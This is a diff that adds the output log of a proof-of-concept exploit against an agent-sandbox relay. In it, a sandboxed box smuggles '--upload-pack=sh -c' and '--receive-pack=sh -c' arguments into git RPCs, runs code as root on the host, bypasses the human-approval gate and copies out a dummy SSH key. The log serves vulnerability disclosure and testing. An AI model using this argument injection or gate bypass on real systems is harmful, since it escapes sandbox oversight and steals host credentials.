@@ -1,0 +1,28 @@
+
+== 1. Set up a host repo + a host secret (what the box must not be able to reach) ==
+   host repo:   /tmp/agentbox-relay-poc.DGg4A8/hostrepo
+   host secret: /tmp/agentbox-relay-poc.DGg4A8/host-home/.ssh/id_ed25519 (contents: "SUPER-SECRET-HOST-SSH-KEY-DO-NOT-LEAK")
+
+== 2. Boot the REAL relay in host mode (default in-memory store) ==
+   relay listening at http://127.0.0.1:38149
+   registered box (POST /admin/register-box -> 204)
+
+== 3a. Attack via git.fetch (NO approval gate at all) ==
+   box POSTs /rpc git.fetch with remote=<path> and args=[--upload-pack=sh -c "..."]
+   /rpc git.fetch -> HTTP 500 (not 202/pending -> no human was asked)
+
+== 3b. Attack via git.push to the default agentbox/<name> scratch branch (gate bypassed) ==
+   box POSTs /rpc git.push with remote=<path> and args=[--receive-pack=sh -c "..."]
+   /rpc git.push -> HTTP 500 (not 202/pending -> no human was asked)
+
+== 4. Result ==
+VULNERABLE -- a box with only its bearer token ran code on the HOST:
+
+     PWNED via git.push scratch-branch
+     uid=0(root) gid=0(root) groups=0(root)
+     vm
+     
+     HOST SECRET EXFILTRATED -> /tmp/agentbox-relay-poc.DGg4A8/STOLEN_HOST_KEY:
+        "SUPER-SECRET-HOST-SSH-KEY-DO-NOT-LEAK"
+   git.fetch path executed: true   git.push scratch-branch path executed: true
+   relay ever prompted/gated for approval: NO
